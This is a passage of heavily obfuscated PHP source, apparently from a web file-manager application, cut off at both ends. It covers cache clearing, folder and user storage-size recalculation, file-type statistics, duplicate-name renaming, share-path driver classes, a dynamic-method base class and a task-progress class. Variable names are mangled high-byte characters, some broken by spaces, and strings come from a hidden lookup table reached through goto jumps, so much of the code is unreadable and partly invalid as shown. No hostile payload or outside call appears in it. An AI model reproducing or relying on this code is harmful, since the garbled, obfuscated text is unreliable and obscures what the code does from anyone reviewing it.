self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ãû±¤ŸÑ[463] . $”øˆÖî³]); unset(self::$cachePathInfoMore[$”øˆÖî³]); unset(self::$cachePathInfo[$Ãû±¤ŸÑ[2124] . $”øˆÖî³]); unset(self::$cachePathInfo[$Ãû±¤ŸÑ[2125] . $”øˆÖî³]); } public function metaSet($ ş‚÷ï–, $ó‡à”Ú  = null, $ñ ä¢á = null) { $ßÜéÂ¦Ï = parent::metaSet($ ş‚÷ï–, $ó‡à”Ú , $ñ ä¢á); if ($ßÜéÂ¦Ï) { $this->sourceCacheClear($ ş‚÷ï–); } return $ßÜéÂ¦Ï; } public function pathInfoByPath($¥½²Ÿ, $æğŸñÜÁ) { $ÂãÅæ¸¶ =& $_SERVER[¯µç›È¢]; $Ùæô¥Ê = !$æğŸñÜÁ ? array() : explode($ÂãÅæ¸¶[8], trim($æğŸñÜÁ, $ÂãÅæ¸¶[8])); $Âçâ²İê = $¥½²Ÿ; foreach ($Ùæô¥Ê as $§Ñ¶æü¹) { $òµÜ–‹ = array($ÂãÅæ¸¶[503] => $Âçâ²İê, $ÂãÅæ¸¶[32] => $§Ñ¶æü¹); $§øºş¨º = $this->where($òµÜ–‹)->select(); if (!$§øºş¨º) { return !1; } $§øºş¨º = array_sort_by($§øºş¨º, $ÂãÅæ¸¶[436]); $Âçâ²İê = $§øºş¨º[0][$ÂãÅæ¸¶[408]]; } return $this->pathInfo($Âçâ²İê, !0); } protected function updateModifyTime($Ãï£¹Ü£) { $¢ËÌ€”‘ =& $_SERVER[¯µç›È¢]; $ğ°óÔş¸ = defined($¢ËÌ€”‘[479]) ? USER_ID : $¢ËÌ€”‘[204]; if (!$Ãï£¹Ü£) { return; } if (!is_array($Ãï£¹Ü£)) { $Ãï£¹Ü£ = array($Ãï£¹Ü£); } foreach ($Ãï£¹Ü£ as $©äòùÒ‚ => $³£ç£ô½) { $Ãï£¹Ü£[$©äòùÒ‚] = intval($³£ç£ô½); $this->sourceCacheClear($³£ç£ô½); } $Ğ›œÃ® = array($¢ËÌ€”‘[408] => array($¢ËÌ€”‘[7], $Ãï£¹Ü£)); $÷ÍéË”† = array($¢ËÌ€”‘[591] => $ğ°óÔş¸, $¢ËÌ€”‘[430] => time()); $this->where($Ğ›œÃ®)->save($÷ÍéË”†); } public function folderSizeReset($â¼à®Ó², $ûé¶Êø´ = false) { $”º£Æàø =& $_SERVER[¯µç›È¢]; if ($this->statusIgnoreResetSpace) { return; } $ÛÒâ•®Ò = $this->sourceInfo($â¼à®Ó²); $—øÕìşÓ = $”º£Æàø[2126] . $â¼à®Ó²; CacheLock::lock($—øÕìşÓ, 20); if ($ûé¶Êø´ === !1) { $this->sourceCacheClear($â¼à®Ó²); $ÛÒâ•®Ò = $this->sourceInfo($â¼à®Ó²); $ëĞ‡«• = array($”º£Æàø[407] => $â¼à®Ó², $”º£Æàø[435] => 0); $ŞæØ êˆ = $this->where($ëĞ‡«•)->sum($”º£Æàø[90]); $ûé¶Êø´ = intval($ŞæØ êˆ) - intval($ÛÒâ•®Ò[$”º£Æàø[90]]); } if ($ûé¶Êø´ == 0) { return CacheLock::unlock($—øÕìşÓ); } $õ„Ë”ÍŸ = $this->parentLevelArray($ÛÒâ•®Ò[$”º£Æàø[526]]); if (!$õ„Ë”ÍŸ) { $õ„Ë”ÍŸ = array(); } $õ„Ë”ÍŸ[] = $ÛÒâ•®Ò[$”º£Æàø[408]]; $ëĞ‡«• = array($”º£Æàø[408] => array($”º£Æàø[424], $õ„Ë”ÍŸ)); if ($ûé¶Êø´ < 0) { $ëĞ‡«•[$”º£Æàø[90]] = array($”º£Æàø[1027], abs($ûé¶Êø´)); } $this->where($ëĞ‡«•)->setAdd($”º£Æàø[90], $ûé¶Êø´); CacheLock::unlock($—øÕìşÓ); $‹Ù´¨³‰ = $”º£Æàø[2127] . $ÛÒâ•®Ò[$”º£Æàø[417]] . $”º£Æàø[4] . $ÛÒâ•®Ò[$”º£Æàø[510]]; $’î÷Óàã = array($ÛÒâ•®Ò[$”º£Æàø[417]], $ÛÒâ•®Ò[$”º£Æàø[510]]); TaskRun::timeLimitCall($‹Ù´¨³‰, $”º£Æàø[2128], $’î÷Óàã, 1.5); } public function folderSizeResetChildren($¢‘‰öÖ) { $©ô¦“œğ =& $_SERVER[¯µç›È¢]; $this->sourceCacheClear($¢‘‰öÖ); $ùüªÇ“ = $this->sourceInfo($¢‘‰öÖ); $Ìª©¬©ü = array($©ô¦“œğ[585] => 1, $©ô¦“œğ[589] => $ùüªÇ“[$©ô¦“œğ[510]], $©ô¦“œğ[592] => array($©ô¦“œğ[552], $ùüªÇ“[$©ô¦“œğ[526]] . $¢‘‰öÖ . $©ô¦“œğ[553])); $†ƒ£ß´ı = $©ô¦“œğ[2129]; $á«ÄÑƒ· = $this->field($†ƒ£ß´ı)->where($Ìª©¬©ü)->select(); $Ìª©¬©ü[$©ô¦“œğ[416]] = 0; $è¼¸èó¶ = $this->field($†ƒ£ß´ı)->where($Ìª©¬©ü)->select(); if (!$è¼¸èó¶) { return; } $á«ÄÑƒ·[] = $ùüªÇ“; $á«ÄÑƒ· = array_to_keyvalue($á«ÄÑƒ·, $©ô¦“œğ[408]); foreach ($á«ÄÑƒ· as $óÍÈíàÁ => $Û³¢©­) { $á«ÄÑƒ·[$óÍÈíàÁ][$©ô¦“œğ[2130]] = $á«ÄÑƒ·[$óÍÈíàÁ][$©ô¦“œğ[90]]; $á«ÄÑƒ·[$óÍÈíàÁ][$©ô¦“œğ[90]] = 0; } foreach ($è¼¸èó¶ as $Û³¢©­) { $Ğ™“ØÀÌ = $Û³¢©­[$©ô¦“œğ[503]] . $©ô¦“œğ[12]; if (!isset($á«ÄÑƒ·[$Ğ™“ØÀÌ])) { continue; } if ($Û³¢©­[$©ô¦“œğ[436]] == $á«ÄÑƒ·[$Ğ™“ØÀÌ][$©ô¦“œğ[436]]) { $á«ÄÑƒ·[$Ğ™“ØÀÌ][$©ô¦“œğ[90]] += $Û³¢©­[$©ô¦“œğ[90]]; } } foreach ($á«ÄÑƒ· as $Û³¢©­) { $‚´ñÜíÓ = $this->parentLevelArray($Û³¢©­[$©ô¦“œğ[526]]); foreach ($‚´ñÜíÓ as $Ğ™“ØÀÌ) { $Ğ™“ØÀÌ = $Ğ™“ØÀÌ . $©ô¦“œğ[12]; if (!isset($á«ÄÑƒ·[$Ğ™“ØÀÌ])) { continue; } if ($Û³¢©­[$©ô¦“œğ[436]] == $á«ÄÑƒ·[$Ğ™“ØÀÌ][$©ô¦“œğ[436]]) { $á«ÄÑƒ·[$Ğ™“ØÀÌ][$©ô¦“œğ[90]] += $Û³¢©­[$©ô¦“œğ[90]]; } } } $¦Üè±š¦ = array(); foreach ($á«ÄÑƒ· as $Û³¢©­) { if ($Û³¢©­[$©ô¦“œğ[90]] == $Û³¢©­[$©ô¦“œğ[2130]]) { continue; } $¦Üè±š¦[] = array($©ô¦“œğ[408], $Û³¢©­[$©ô¦“œğ[408]], $©ô¦“œğ[90], $Û³¢©­[$©ô¦“œğ[90]]); } $this->saveAll($¦Üè±š¦); } public function userSpaceReset($è•­«•„ = false) { $ëó®¢öÚ =& $_SERVER[¯µç›È¢]; $İîÏß®’ = $this->where(array($ëó®¢öÚ[417] => self::TYPE_USER, $ëó®¢öÚ[510] => $è•­«•„, $ëó®¢öÚ[416] => 0))->sum($ëó®¢öÚ[90]); $İîÏß®’ = !$İîÏß®’ || $İîÏß®’ <= 0 ? 0 : $İîÏß®’; Model($ëó®¢öÚ[518])->userEdit($è•­«•„, array($ëó®¢öÚ[1823] => $İîÏß®’)); } public function targetSpaceUpdate($¹å±§è´, $Òşæ ´Æ) { $İÎ—¢—Ê =& $_SERVER[¯µç›È¢]; if (!$Òşæ ´Æ) { return; } if (!in_array($¹å±§è´, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $öä˜Ø–” = $this->targetSpaceSize($¹å±§è´, $Òşæ ´Æ); if ($¹å±§è´ == self::TYPE_USER) { Model($İÎ—¢—Ê[518])->userEdit($Òşæ ´Æ, array($İÎ—¢—Ê[1823] => $öä˜Ø–”)); } else { if ($¹å±§è´ == self::TYPE_GROUP) { Model($İÎ—¢—Ê[527])->groupEdit($Òşæ ´Æ, array($İÎ—¢—Ê[1823] => $öä˜Ø–”)); } } } public function targetSpaceSize($å–õÕí­, $÷‡¤¥Ç) { $¹ÉÜí¦Ç =& $_SERVER[¯µç›È¢]; $÷å´¦å = $this->sourceRoot($å–õÕí­, $÷‡¤¥Ç, !0); if (!$÷å´¦å) { return 0; } $ê«£ = floatval($÷å´¦å[$¹ÉÜí¦Ç[90]]); $èÊÊçìö = array($¹ÉÜí¦Ç[592] => array($¹ÉÜí¦Ç[552], $¹ÉÜí¦Ç[536] . $÷å´¦å[$¹ÉÜí¦Ç[408]] . $¹ÉÜí¦Ç[553])); $Ëºï»ã = Model($¹ÉÜí¦Ç[434])->field($¹ÉÜí¦Ç[423])->where($èÊÊçìö)->select(); $Ëºï»ã = array_to_keyvalue($Ëºï»ã, $¹ÉÜí¦Ç[12], $¹ÉÜí¦Ç[408]); $Ëºï»ã = array_unique(array_filter($Ëºï»ã)); if ($Ëºï»ã) { $èÊÊçìö = array($¹ÉÜí¦Ç[423] => array($¹ÉÜí¦Ç[424], $Ëºï»ã)); $ê«£ += floatval($this->where($èÊÊçìö)->sum($¹ÉÜí¦Ç[90])); } $ê«£ = !$ê«£ || $ê«£ <= 0 ? 0 : $ê«£; return $ê«£; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($¢Œ¿ë) { return $this->fileTypeProfile($¢Œ¿ë, SourceModel::TYPE_USER); } public function groupFileTypeProfile($­¡ŒŠù) { return $this->fileTypeProfile($­¡ŒŠù, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¹Òşğ²ƒ, $¬Áã’ŸŒ) { $ÀÅÅ¯É =& $_SERVER[¯µç›È¢]; $òçæ£ğì = $ÀÅÅ¯É[2131] . $¹Òşğ²ƒ . $ÀÅÅ¯É[11] . $¬Áã’ŸŒ; $•ş¢ €è = Cache::get($òçæ£ğì); if ($•ş¢ €è) { return $•ş¢ €è; } $üê€¹… = array($ÀÅÅ¯É[585] => 0); if ($¹Òşğ²ƒ != !1) { $üê€¹…[$ÀÅÅ¯É[510]] = $¹Òşğ²ƒ; $üê€¹…[$ÀÅÅ¯É[417]] = $¬Áã’ŸŒ; } $‹óéÉàì = array(); $‹óéÉàì[$ÀÅÅ¯É[2132]] = array($ÀÅÅ¯É[2133] => LNG($ÀÅÅ¯É[2132]), $ÀÅÅ¯É[2134] => $this->where($üê€¹…)->count(), $ÀÅÅ¯É[587] => $this->where($üê€¹…)->sum($ÀÅÅ¯É[90])); $Í©éÌıü = KodIO::fileTypeList(); foreach ($Í©éÌıü as $§«ÀÇ¹Ô => $‡Îû·¯â) { $üê€¹…[$ÀÅÅ¯É[418]] = $this->fileTypeWhere($§«ÀÇ¹Ô); $‹óéÉàì[$§«ÀÇ¹Ô] = array($ÀÅÅ¯É[2133] => $‡Îû·¯â[$ÀÅÅ¯É[32]], $ÀÅÅ¯É[2134] => $this->where($üê€¹…)->count(), $ÀÅÅ¯É[587] => $this->where($üê€¹…)->sum($ÀÅÅ¯É[90])); } Cache::set($òçæ£ğì, $‹óéÉàì, 1200); return $‹óéÉàì; } public function fileNameExist($¡Şê¿Ş, $•ÔÅ·) { $ÑŞúôé  =& $_SERVER[¯µç›È¢]; $Ö‘íÁ = $this->where(array($ÑŞúôé [503] => $¡Şê¿Ş, $ÑŞúôé [32] => $•ÔÅ·, $ÑŞúôé [436] => 0))->find(); return is_array($Ö‘íÁ) ? $Ö‘íÁ[$ÑŞúôé [408]] : !1; } public function childList($«“ù“•…) { $ª¿€µÏŸ =& $_SERVER[¯µç›È¢]; $Â£·â¼ = $ª¿€µÏŸ[2109] . $«“ù“•…; if (isset(self::$cacheChildList[$Â£·â¼])) { return self::$cacheChildList[$Â£·â¼]; } $‚¬É®§” = array($ª¿€µÏŸ[503] => intval($«“ù“•…), $ª¿€µÏŸ[436] => 0); $¬şÕ = $this->where($‚¬É®§”)->select(); $¬şÕ = $¬şÕ ? $¬şÕ : array(); self::$cacheChildList[$Â£·â¼] = $¬şÕ; foreach ($¬şÕ as $ÍİÇ‡Ñå) { $Â£·â¼ = $ª¿€µÏŸ[463] . $ÍİÇ‡Ñå[$ª¿€µÏŸ[408]]; self::$cacheSourceInfo[$Â£·â¼] = $ÍİÇ‡Ñå; } return $¬şÕ; } public function fileNameAuto($éİ‚ˆæ‰, $ı‚¸©ì, $éˆ›æµ = REPEAT_RENAME, $¥¢¤š¬Ä = false) { $Äú¤çã =& $_SERVER[¯µç›È¢]; $”‚È–Ç = array($Äú¤çã[503] => $éİ‚ˆæ‰, $Äú¤çã[436] => 0, $Äú¤çã[32] => array($Äú¤çã[391], $ı‚¸©ì . $Äú¤çã[392])); $›§Èåöø = $this->field($Äú¤çã[32])->where($”‚È–Ç)->select(); $…Ñ¾“´Ì = array_to_keyvalue($›§Èåöø, $Äú¤çã[12], $Äú¤çã[32]); return $this->fileNameAutoGet($…Ñ¾“´Ì, $ı‚¸©ì, $éˆ›æµ, $¥¢¤š¬Ä); } public function fileNameAutoGet($ù¯×Æ›ú, $ª¸ç”‡’, $‡‘€ÀæÒ, $µşş¥„™) { $ÍÉËÔ =& $_SERVER[¯µç›È¢]; if ($‡‘€ÀæÒ == REPEAT_REPLACE || !$ù¯×Æ›ú || !in_array_not_case($ª¸ç”‡’, $ù¯×Æ›ú) || $µşş¥„™ && $‡‘€ÀæÒ != REPEAT_RENAME_FOLDER) { return $ª¸ç”‡’; } if ($‡‘€ÀæÒ == REPEAT_SKIP) { return !1; } $ğËæòÈú = $ÍÉËÔ[10] . get_path_ext($ª¸ç”‡’); $ğËæòÈú = $ğËæòÈú == $ÍÉËÔ[10] || $µşş¥„™ ? $ÍÉËÔ[12] : $ğËæòÈú; for ($ù÷ì«‘ = 1; $ù÷ì«‘ <= count($ù¯×Æ›ú) + 1; $ù÷ì«‘++) { $‚¥×ÒÕ” = substr($ª¸ç”‡’, 0, strlen($ª¸ç”‡’) - strlen($ğËæòÈú)); $ò‰ÎîÇş = $‚¥×ÒÕ” . "\x28{$ù÷ì«‘}\51{$ğËæòÈú}"; if (!in_array_not_case($ò‰ÎîÇş, $ù¯×Æ›ú)) { return $ò‰ÎîÇş; } } } } goto eğÉ›áŒˆ; b¶¨¾­”ê«: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ªîåâÊÒ) { $this->pathParse = $ªîåâÊÒ; $this->model = Model($_SERVER[¯µç›È¢][1337]); } public function getPathOuter($¿õ³ŸŒş) { $‡Ìäšî¿ =& $_SERVER[¯µç›È¢]; if (!$¿õ³ŸŒş) { return $¿õ³ŸŒş; } $üñŞƒ © = $this->parse($¿õ³ŸŒş); return trim(KodIO::makeShare($this->pathParse[$‡Ìäšî¿[405]], $üñŞƒ ©[$‡Ìäšî¿[405]]), $‡Ìäšî¿[8]); } protected function infoParse($äÍíçßÎ, $¼ÕˆÄ‘ã = false, $È§¢µÉ = false) { $ïÏ‹âñ€ =& $_SERVER[¯µç›È¢]; $ĞşÏêû¨ = $this->pathParse[$ïÏ‹âñ€[405]]; $Ù±ƒƒ„ã = trim($this->pathParse[$ïÏ‹âñ€[1179]], $ïÏ‹âñ€[8]); return Action($ïÏ‹âñ€[1345])->sharePathInfo($ĞşÏêû¨, $Ù±ƒƒ„ã, $¼ÕˆÄ‘ã); } public function infoFull($´ˆß’º) { $®©”ÍÒÚ =& $_SERVER[¯µç›È¢]; $½íáüÀ· = explode($®©”ÍÒÚ[8], trim($´ˆß’º, $®©”ÍÒÚ[8])); if (count($½íáüÀ·) > 1) { $´à‚Ô¤ï = implode($®©”ÍÒÚ[8], array_splice($½íáüÀ·, 1)); $ÖÓá°‹İ = $this->model->pathInfoByPath($½íáüÀ·[0], $´à‚Ô¤ï); if (!$ÖÓá°‹İ) { return !1; } $this->pathParse[$®©”ÍÒÚ[1179]] = $ÖÓá°‹İ[$®©”ÍÒÚ[408]]; } return $this->infoParse($´ˆß’º); } public function listAll($ª‹…œÁ) { $¼í¨Ä© =& $_SERVER[¯µç›È¢]; $µ£çÛÄê = IO::info($this->pathParse[$¼í¨Ä©[88]]); if (!$µ£çÛÄê) { return array(); } $¢›»Çí = $this->model->listAll($ª‹…œÁ); $¡¿Å§„Ï = Model($¼í¨Ä©[603])->getInfo($µ£çÛÄê[$¼í¨Ä©[493]]); $†Î¶©ìÛ = Action($¼í¨Ä©[1345]); foreach ($¢›»Çí as &$¹ª…¶ñ§) { check_abort(); $¹ª…¶ñ§[$¼í¨Ä©[97]] = $†Î¶©ìÛ->_shareItemeParse($¹ª…¶ñ§[$¼í¨Ä©[97]], $¡¿Å§„Ï); } unset($¹ª…¶ñ§); return $¢›»Çí; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ğ©¨ìÀå) { $this->pathParse = $Ğ©¨ìÀå; $this->model = Model($_SERVER[¯µç›È¢][1337]); } protected function infoParse($»¬è®üÛ, $ìé¶ŞøÛ = false, $Èß¹ôê˜ = false) { $¨«İƒşü =& $_SERVER[¯µç›È¢]; return Action($¨«İƒşü[1185])->sharePathInfo($this->pathParse[$¨«İƒşü[88]], !0, $ìé¶ŞøÛ); } public function listPath($¿Ñ¢ñã, $Ü‡¦×ò— = false) { $Áôãêù =& $_SERVER[¯µç›È¢]; $ÛÇÈ§”Ç = parent::listPath($¿Ñ¢ñã, $Ü‡¦×ò—); if (!$ÛÇÈ§”Ç) { return $ÛÇÈ§”Ç; } if (is_array($ÛÇÈ§”Ç[$Áôãêù[1346]])) { $ÛÇÈ§”Ç[$Áôãêù[1346]] = Action($Áôãêù[1185])->shareItemInfo($ÛÇÈ§”Ç[$Áôãêù[1346]]); } foreach ($ÛÇÈ§”Ç as $Í¾ı™ÜÕ => $‹«¬â»’) { if (!in_array($Í¾ı™ÜÕ, array($Áôãêù[86], $Áôãêù[87]))) { continue; } foreach ($‹«¬â»’ as $å°Ş…Ì => $¸¬Ğ¦¨‚) { $ÛÇÈ§”Ç[$Í¾ı™ÜÕ][$å°Ş…Ì] = Action($Áôãêù[1185])->shareItemInfo($¸¬Ğ¦¨‚); } } return $ÛÇÈ§”Ç; } public function listAll($…‘¹™Ó“) { $‘Ò£”µû =& $_SERVER[¯µç›È¢]; $À¡Ôó¸Ş = IO::info($this->pathParse[$‘Ò£”µû[88]]); if (!$À¡Ôó¸Ş) { return array(); } $É’şš«ï = $this->model->listAll($…‘¹™Ó“); foreach ($É’şš«ï as &$Ïñ©¤·») { $Ïñ©¤·»[$‘Ò£”µû[97]] = Action($‘Ò£”µû[1185])->shareItemInfo($Ïñ©¤·»[$‘Ò£”µû[97]]); } unset($Ïñ©¤·»); return $É’şš«ï; } } class PathDriverDriverShareItem { public function __construct($š×å¼„ò) { $this->pathParse = $š×å¼„ò; } public function __call($Ò•ÀäÒ¹, $ËËÌ¼œ) { $€˜¹ê†Å =& $_SERVER[¯µç›È¢]; if (method_exists($this, $Ò•ÀäÒ¹)) { return; } $ÆëÖö¼ = call_user_func_array(array($€˜¹ê†Å[1347], $Ò•ÀäÒ¹), $ËËÌ¼œ); $¤„ªÌ = array($€˜¹ê†Å[1348], $€˜¹ê†Å[1349], $€˜¹ê†Å[1350], $€˜¹ê†Å[1351], $€˜¹ê†Å[557], $€˜¹ê†Å[559], $€˜¹ê†Å[1352], $€˜¹ê†Å[118], $€˜¹ê†Å[1353], $€˜¹ê†Å[1354]); if (in_array($Ò•ÀäÒ¹, $¤„ªÌ)) { $ÆëÖö¼ = $this->getPathOuter($ÆëÖö¼); } return $ÆëÖö¼; } public function copy($·¬Ê‡, $İƒÊŠ­Ä, $³øø˜¬ = false, $ç¡”µË¹ = false) { return $this->copyMove($·¬Ê‡, $İƒÊŠ­Ä, $³øø˜¬, $_SERVER[¯µç›È¢][557], $ç¡”µË¹); } public function move($€¤ƒ’¸İ, $Ğ”§ñ÷¤, $Úî‡Áš¡ = false, $Ï÷–ÁÌ = false) { return $this->copyMove($€¤ƒ’¸İ, $Ğ”§ñ÷¤, $Úî‡Áš¡, $_SERVER[¯µç›È¢][559], $Ï÷–ÁÌ); } private function copyMove($ÈÇ×‚§¤, $¤´ÜÎ”±, $‰Ö²¨˜Û, $à¾¤ßå, $òÖñ¤¶¾ = false) { $àù»â›Ï =& $_SERVER[¯µç›È¢]; $Á¤Ìöü‡ = $¤´ÜÎ”±; $—¦ü›„Ä = IO::driverMake($¤´ÜÎ”±); if ($—¦ü›„Ä->pathParse[$àù»â›Ï[1163]]) { $¤´ÜÎ”± = $—¦ü›„Ä->pathParse[$àù»â›Ï[1163]]; } else { $¤´ÜÎ”± = $Á¤Ìöü‡; } $™£ÚÃ®è = IO::copyMove($ÈÇ×‚§¤, $¤´ÜÎ”±, $‰Ö²¨˜Û, $à¾¤ßå, $òÖñ¤¶¾); $™£ÚÃ®è = $this->getPathOuter($™£ÚÃ®è); return $™£ÚÃ®è; } public function pathThis($‚ÚôëË) { return get_path_this($this->pathParse[$_SERVER[¯µç›È¢][88]]); } public function pathFather($øØµ†¯Ã) { return get_path_father($this->pathParse[$_SERVER[¯µç›È¢][88]]); } public function iconvSystem($­ü§¥Ğù) { return $­ü§¥Ğù; } protected function infoParse($´¡ªñÊ, $ñ×ÓÉßÒ = false) { $æÇÏß† =& $_SERVER[¯µç›È¢]; $öÚªüíì = $this->pathParse[$æÇÏß†[491]][$æÇÏß†[1186]] . $this->pathParse[$æÇÏß†[1179]]; if ($ñ×ÓÉßÒ) { $­¶ÅÂ³Ü = IO::infoWithChildren($öÚªüíì); } else { $­¶ÅÂ³Ü = IO::info($öÚªüíì); } $æ®âºìÅ = $this->pathParse[$æÇÏß†[491]]; return Action($æÇÏß†[1345])->_shareItemeParse($­¶ÅÂ³Ü, $æ®âºìÅ); } public function listAll($ğÒê»ò¾) { $áùãÄ©ş =& $_SERVER[¯µç›È¢]; $ Ç†»¯ = IO::listAll($ğÒê»ò¾); $…ÖùØİ = $this->pathParse[$áùãÄ©ş[491]]; foreach ($ Ç†»¯ as &$ÕÒ¨Í—¶) { check_abort(); $ş‹°¾…¨ = IO::info($ÕÒ¨Í—¶[$áùãÄ©ş[88]]); $ş‹°¾…¨ = is_array($ş‹°¾…¨) ? $ş‹°¾…¨ : array(); $ÕÒ¨Í—¶ = array_merge($ş‹°¾…¨, $ÕÒ¨Í—¶); $ÕÒ¨Í—¶[$áùãÄ©ş[97]] = Action($áùãÄ©ş[1345])->_shareItemeParse($ÕÒ¨Í—¶, $…ÖùØİ); } unset($ÕÒ¨Í—¶); return $ Ç†»¯; } public function getPathOuter($†·ÖåÁ) { $åç´æ» =& $_SERVER[¯µç›È¢]; $è½î……Â = KodIO::parse($†·ÖåÁ); if ($è½î……Â[$åç´æ»[33]] == KodIO::KOD_SHARE_ITEM) { return $è½î……Â[$åç´æ»[88]]; } $¾ü»²¼ = KodIO::clear($†·ÖåÁ); $İÉöš¼¹ = KodIO::clear($this->pathParse[$åç´æ»[491]][$åç´æ»[1186]]); $šÇ¦Ä¹á = substr($¾ü»²¼, strlen($İÉöš¼¹)); if (substr($¾ü»²¼, 0, strlen($İÉöš¼¹)) != $İÉöš¼¹) { return !1; } return $this->pathParse[$åç´æ»[1180]] . $åç´æ»[8] . ltrim($šÇ¦Ä¹á, $åç´æ»[8]); } public function getType() { $Å¾¸ÁÔ =& $_SERVER[¯µç›È¢]; $ç£©×ö¶ = str_replace($Å¾¸ÁÔ[84], $Å¾¸ÁÔ[12], get_class($this)); return strtolower($ç£©×ö¶); } public function isTypeObject($šûş‚Áƒ) { return IO::isTypeObject($šûş‚Áƒ); } public function info($ù–ÅÇòà) { return $this->infoParse($ù–ÅÇòà); } public function infoAuth($ãˆ×Âí†) { return $this->infoParse($ãˆ×Âí†); } public function infoWithChildren($Ô¾¤‘ÓÜ) { return $this->infoParse($Ô¾¤‘ÓÜ, !0); } public function infoFull($¶÷´œ) { return $this->infoParse($¶÷´œ); } } goto f—¤íÖëè›; aØ‰¼³ÅÁ‘: function binCheckBigger($¡†ô»¦ğ, $â‹ûİ½×) { return $¡†ô»¦ğ > $â‹ûİ½×; } $_SERVER[$_SERVER[”º£†Ô][3]] = ("\x38\x30\x35\x39".base64_decode('NDA='))+0;$_lx6u="6fxycvd0g8ia73sjhpl4orbuw529mnqzkt1e4e6hmi3ropxcfutz7b8aws2gylnq9";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($²šíÛ¸, $’¥ëšàú) { $¸Âß¥‡¥ =& $_SERVER[¯µç›È¢]; if (isset(self::$_methodList[$²šíÛ¸])) { return @call_user_func_array(self::$_methodList[$²šíÛ¸], $’¥ëšàú); } else { if (method_exists($this, $²šíÛ¸)) { return call_user_func_array(array($this, $²šíÛ¸), $’¥ëšàú); } else { think_exception(__CLASS__ . $¸Âß¥‡¥[4] . $²šíÛ¸ . $¸Âß¥‡¥[5]); } } } public static function __callStatic($ÌÍø–ê, $ê³Ë†Ğ) { if (isset(self::$_methodListStatic[$ÌÍø–ê])) { return call_user_func_array(self::$_methodListStatic[$ÌÍø–ê], $ê³Ë†Ğ); } else { if (method_exists(self, $ÌÍø–ê)) { return call_user_func_array(array(self, $ÌÍø–ê), $ê³Ë†Ğ); } else { show_json("{$ÌÍø–ê}\50\51\40\x6e\157\164\40\x65\170\151\163\x74\73", !1); } } } public static function addMethod($›Ÿ©†³ó, $¾šŒßáä) { self::$_methodList[$›Ÿ©†³ó] = $¾šŒßáä; } public static function addMethodStatic($ïÂ²İÙ, $›ÛåÀÜ) { self::$_methodListStatic[$ïÂ²İÙ] = $›ÛåÀÜ; } } goto a¢¥ˆÖ‡æ ; CŠ½Öò É: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($ñ©‡ÑÌÀ, $øé¼¾À§ = '', $´îãäÏ’ = 0, $‚Ì˜ãö = '') { $œô”ÎÁ¼ =& $_SERVER[¯µç›È¢]; if (self::get($ñ©‡ÑÌÀ)) { return; } $this->task = array($œô”ÎÁ¼[405] => $ñ©‡ÑÌÀ, $œô”ÎÁ¼[1666] => USER_ID, $œô”ÎÁ¼[1566] => $‚Ì˜ãö, $œô”ÎÁ¼[33] => $øé¼¾À§, $œô”ÎÁ¼[1076] => $œô”ÎÁ¼[12], $œô”ÎÁ¼[803] => $´îãäÏ’, $œô”ÎÁ¼[1667] => 0, $œô”ÎÁ¼[1668] => 0, $œô”ÎÁ¼[1669] => 0, $œô”ÎÁ¼[1670] => timeFloat(), $œô”ÎÁ¼[1671] => 0, $œô”ÎÁ¼[1672] => 0, $œô”ÎÁ¼[1673] => 0, $œô”ÎÁ¼[1674] => 0, $œô”ÎÁ¼[767] => $œô”ÎÁ¼[1626]); $GLOBALS[$œô”ÎÁ¼[1675]] = 1; Hook::bind($œô”ÎÁ¼[1629], array($this, $œô”ÎÁ¼[1676])); Hook::bind($œô”ÎÁ¼[1677], array($this, $œô”ÎÁ¼[1678])); $this->startAfter(); Hook::trigger($œô”ÎÁ¼[1679], $this->task); $this->task[$œô”ÎÁ¼[1672]] = timeFloat(); } public function end() { $èœøÑáÁ =& $_SERVER[¯µç›È¢]; if (!$this->task) { return; } if ($this->task[$èœøÑáÁ[1672]]) { self::valueSet($this->task[$èœøÑáÁ[405]], !1); } $–¾Şò×ı = timeFloat() - $this->task[$èœøÑáÁ[1670]]; self::log($èœøÑáÁ[1680] . $this->task[$èœøÑáÁ[405]] . $èœøÑáÁ[1681] . $–¾Şò×ı . $èœøÑáÁ[1682]); Hook::unbind($èœøÑáÁ[1629], array($this, $èœøÑáÁ[1676])); Hook::unbind($èœøÑáÁ[1677], array($this, $èœøÑáÁ[1678])); $this->endAfter(); $this->task = !1; } public function update($ªÅ§²øô = 0, $¬™ç¬Ô¦ = false) { $¬ğÕ°Ç” =& $_SERVER[¯µç›È¢]; $ •™À–À =& $this->task; if (!$ •™À–À) { return; } $ •™À–À[$¬ğÕ°Ç”[1667]] += $ªÅ§²øô; $ •™À–À[$¬ğÕ°Ç”[1671]] = timeFloat(); if ($ •™À–À[$¬ğÕ°Ç”[803]]) { if ($ •™À–À[$¬ğÕ°Ç”[803]] < $ •™À–À[$¬ğÕ°Ç”[1667]]) { $ •™À–À[$¬ğÕ°Ç”[803]] = $ •™À–À[$¬ğÕ°Ç”[1667]]; } $’úıÏ¶Ï = timeFloat() - $ •™À–À[$¬ğÕ°Ç”[1670]] - $ •™À–À[$¬ğÕ°Ç”[1673]]; if ($’úıÏ¶Ï <= 0) { $’úıÏ¶Ï = 0.001; } $ •™À–À[$¬ğÕ°Ç”[1668]] = $ •™À–À[$¬ğÕ°Ç”[1667]] / $ •™À–À[$¬ğÕ°Ç”[803]]; $ •™À–À[$¬ğÕ°Ç”[1669]] = $ •™À–À[$¬ğÕ°Ç”[1667]] / $’úıÏ¶Ï; if ($ •™À–À[$¬ğÕ°Ç”[1668]] > 0) { $ •™À–À[$¬ğÕ°Ç”[1674]] = $’úıÏ¶Ï * (1 - $ •™À–À[$¬ğÕ°Ç”[1668]]) / $ •™À–À[$¬ğÕ°Ç”[1668]]; } $ •™À–À[$¬ğÕ°Ç”[1674]] = $ •™À–À[$¬ğÕ°Ç”[1674]] <= 0 ? 0 : $ 